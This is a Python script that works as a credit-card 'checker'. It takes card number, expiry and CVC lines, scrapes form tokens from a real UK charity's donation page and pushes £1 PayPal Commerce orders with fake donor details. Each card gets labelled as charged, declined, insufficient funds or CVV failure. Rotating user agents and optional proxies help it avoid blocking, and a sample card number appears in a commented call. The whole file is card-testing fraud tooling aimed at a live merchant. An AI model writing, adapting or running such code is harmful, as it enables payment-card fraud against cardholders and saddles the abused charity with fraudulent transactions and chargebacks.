import requests,base64
# r=requests.Session()  # REPLACED: Move inside function for thread safety
import re
import time
import subprocess
from user_agent import *
# user=generate_user_agent() # REPLACED: Generate inside to avoid stale UA
from requests_toolbelt.multipart.encoder import MultipartEncoder

def drgam(ccx, proxy=None):#@I_PNP
	ccx=ccx.strip()
	parts = ccx.split("|")
	if len(parts) < 4:
		return "INVALID FORMAT"
	
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3].strip()
	
	if "20" in yy:
		yy = yy.split("20")[1]	
	
	# Create local session for thread safety
	r = requests.Session()
	if proxy:
		r.proxies = {"http": proxy, "https": proxy}
	
	user = generate_user_agent()
	headers = {
	    'user-agent': user,
	}
	
	timeout = 25 # Standard timeout

	try:
		response = r.get(f'https://sfts.org.uk/donate/', cookies=r.cookies, headers=headers, timeout=timeout)
		
		# Robust regex handling
		try:
			id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
			id_form2 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
			nonec = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
			enc = re.search(r'"data-client-token":"(.*?)"',response.text).group(1)
		except AttributeError:
			if response.status_code != 200:
				return f"Site Error: HTTP {response.status_code}"
			if "Cloudflare" in response.text or "Checking your browser" in response.text:
				return "Cloudflare Blocked"
			return "Regex Failure: Token not found"

		dec = base64.b64decode(enc).decode('utf-8')
		au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
		
		# Remaining implementation with timeouts...
		headers = {
			'origin': f'https://sfts.org.uk',
			'referer': f'https://sfts.org.uk/donate/',
			'user-agent': user,
			'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
			'give-honeypot': '',
			'give-form-id-prefix': id_form1,
			'give-form-id': id_form2,
			'give-current-url': f'https://sfts.org.uk/donate/',
			'give-form-url': f'https://sfts.org.uk/donate/',
			'give-form-hash': nonec,
			'give-price-id': '3',
			'give-amount': '1.00',
			'payment-mode': 'paypal-commerce',
			'give_first': 'DRGAM',
			'give_last': 'rights',
			'give_email': f'drgam{int(time.time())}@gmail.com',
			'give_action': 'purchase',
			'give-gateway': 'paypal-commerce',
			'action': 'give_process_donation',
			'give_ajax': 'true',
		}
		
		response = r.post(f'https://sfts.org.uk/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data, timeout=timeout)
		
		m_data = MultipartEncoder({
			'give-honeypot': (None, ''),
			'give-form-id-prefix': (None, id_form1),
			'give-form-id': (None, id_form2),
			'give-current-url': (None, f'https://sfts.org.uk/donate/'),
			'give-form-url': (None, f'https://sfts.org.uk/donate/'),
			'give-form-hash': (None, nonec),
			'give-price-id': (None, '3'),
			'give-amount': (None, '1.00'),
			'payment-mode': (None, 'paypal-commerce'),
			'give_first': (None, 'DRGAM'),
			'give_last': (None, 'rights'),
			'give_email': (None, f'drgam{int(time.time())}@gmail.com'),
			'card_name': (None, 'drgam'),
			'give-gateway': (None, 'paypal-commerce'),
		})
		
		headers['content-type'] = m_data.content_type
		
		params = { 'action': 'give_paypal_commerce_create_order' }
		response = r.post(f'https://sfts.org.uk/wp-admin/admin-ajax.php', params=params, cookies=r.cookies, headers=headers, data=m_data, timeout=timeout)
		
		try:
			tok = response.json()['data']['id']
		except:
			return f"Order Creation Failed: {response.text[:200]}"
		
		headers = {
			'authorization': f'Bearer {au}',
			'content-type': 'application/json',
			'paypal-client-metadata-id': '7d9928a1f3f1fbc240cfd71a3eefe835',
			'user-agent': user,
		}
		
		json_data = {
			'payment_source': {
				'card': {
					'number': n,
					'expiry': f'20{yy}-{mm}',
					'security_code': cvc,
					'attributes': {
						'verification': { 'method': 'SCA_WHEN_REQUIRED' },
					},
				},
			},
			'application_context': { 'vault': False },
		}
		
		response = r.post(
			f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
			headers=headers,
			json=json_data,
			timeout=timeout
		)
			
		m_data = MultipartEncoder({
			'give-honeypot': (None, ''),
			'give-form-id-prefix': (None, id_form1),
			'give-form-id': (None, id_form2),
			'give-form-hash': (None, nonec),
			'give-price-id': (None, '3'),
			'give-amount': (None, '1.00'),
			'payment-mode': (None, 'paypal-commerce'),
			'give_first': (None, 'DRGAM'),
			'give_last': (None, 'rights'),
			'give_email': (None, f'drgam{int(time.time())}@gmail.com'),
			'give-gateway': (None, 'paypal-commerce'),
		})
		
		headers = {
			'content-type': m_data.content_type,
			'origin': f'https://sfts.org.uk',
			'referer': f'https://sfts.org.uk/donate/',
			'user-agent': user,
		}
		
		params = {
			'action': 'give_paypal_commerce_approve_order',
			'order': tok,
		}
		
		response = r.post(
			f'https://sfts.org.uk/wp-admin/admin-ajax.php',
			params=params,
			cookies=r.cookies,
			headers=headers,
			data=m_data,
			timeout=timeout
		)

		text = response.text
		if 'true' in text or 'sucsess' in text:    
			return "Charge !"
		elif 'DO_NOT_HONOR' in text:
			return "Do not honor"
		elif 'CVV2_FAILURE' in text:
			return "Card Issuer Declined CVV"
		elif 'INSUFFICIENT_FUNDS' in text:
			return 'Insufficient Funds'
		elif 'ORDER_NOT_APPROVED' in text:
			return 'ORDER_NOT_APPROVED'
		else:
			try:
				return response.json()['data']['error']
			except:
				return f"DECLINED: {text[:100]}"
				
	except requests.exceptions.Timeout:
		return "Request Timeout"
	except Exception as e:
		return f"Error: {str(e)}"
			
			
# print(drgam('4217834081794714|11|26|614'))